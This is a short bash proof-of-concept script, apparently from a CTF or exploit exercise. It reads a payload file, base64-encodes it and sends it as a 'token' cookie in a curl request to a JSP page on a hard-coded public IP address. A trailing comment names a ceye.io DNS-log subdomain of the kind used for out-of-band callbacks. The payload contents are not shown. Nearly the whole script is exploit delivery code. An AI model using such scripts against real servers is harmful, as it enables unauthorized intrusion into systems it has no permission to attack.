#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/06/22, 19:49

function fuck(){
    # curl -vv -k 'http://30.0.10.21:8080/index.jsp' \
    curl -vv -k 'http://47.110.124.172/index.jsp' \
    -H 'Connection: keep-alive' \
    -H 'Cache-Control: max-age=0' \
    -H 'Origin: http://47.110.124.172' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'DNT: 1' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3683.103 Safari/524.63' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
    -H 'Referer: http://47.110.124.172/index.jsp' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,zh-TW;q=0.7' \
    -H "Cookie: JSESSIONID=BAB57B0CF05C0CF805D5FC837748F0DF; token=$token" 
}

token=$(cat poc1/payload.bin.b64 | base64)
echo
fuck $token


# .sglpih.ceye.io